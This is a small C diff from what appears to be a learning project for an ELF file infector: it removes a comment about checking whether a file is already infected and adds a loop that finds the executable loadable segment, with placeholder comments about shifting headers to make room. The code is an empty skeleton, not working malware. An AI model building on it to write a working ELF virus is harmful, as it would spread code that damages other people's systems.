@@ -232,9 +232,18 @@ int do_the_job(t_file *file)
 			}
 		}
 	}
-	//check if all ready infected
-
-
+	seg = (Elf64_Phdr*)(file->data + header->e_phoff);
+	for (i = header->e_phnum; i-- > 0; seg++)
+	{
+		if (seg->p_type == PT_LOAD)
+		{
+			if (seg->p_flags == (PF_R | PF_X))
+			{
+				//save what i need
+			}
+		}
+	}
+	//after change the header of the others add GETPAGE size
 	return 0;
 }
 
